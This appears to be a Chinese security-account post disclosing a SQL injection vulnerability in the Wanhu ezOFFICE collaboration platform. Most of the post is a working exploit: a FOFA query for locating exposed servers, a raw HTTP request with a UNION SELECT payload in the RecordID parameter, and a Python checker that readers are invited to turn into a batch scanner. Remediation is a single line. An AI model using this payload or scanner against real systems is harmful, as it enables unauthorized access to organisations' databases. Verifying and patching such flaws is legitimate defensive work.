#  安全情报，万户ezOFFICE协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞！！   
原创 Ax  极星信安   2023-11-26 22:03  
  
**声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，禁止私自转载，如需转载，请联系作者！！！！  
  
请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！！！！！  
  
**漏洞介绍**  
  
万户ezOFFICE协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞，万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户ezOFFICE协同管理平台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库相关信息以及数据库权限。  
  
**影响版本**  
```
万户ezOFFICE协同管理平台
```  
  
**漏洞情报**  
  
**fofa语句**  
```
app="万户ezOFFICE协同管理平台"
```  
  
**Poc**  
```
GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```  
  
响应数据包第42,43行包含6cfe798ba8e5b85feb50164c59f4bec9字符串就证明漏洞存在  
  
**Poc验证工具**  
  
这里给个基础的demo，大佬们自己改成批量就可以了。  
```
import requests
ip=input("请输入IP")
# 定义请求头和URL
url = f"http://{ip}/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Connection": "close",
    "Accept": "*/*",
    "Accept-Language": "en",
    "Accept-Encoding": "gzip",
}

# 发送GET请求
response = requests.get(url, headers=headers)

# 检查响应状态码
if response.status_code == 200:
    # 获取响应文本
    response_text = response.text
    # 检查特定字符串是否在响应文本的第42行或43行
    lines = response_text.split('\n')
    if len(lines) >= 43 and ("6cfe798ba8e5b85feb50164c59f4bec9" in lines[42] or "6cfe798ba8e5b85feb50164c59f4bec9" in lines[43]):
        print("验证成功")
    else:
        print("验证失败")
else:
    print("验证失败")

```  
  
**修复建议**  
```
建议及时更新至最新版本！
```  
  
**关注我们**  
  
  
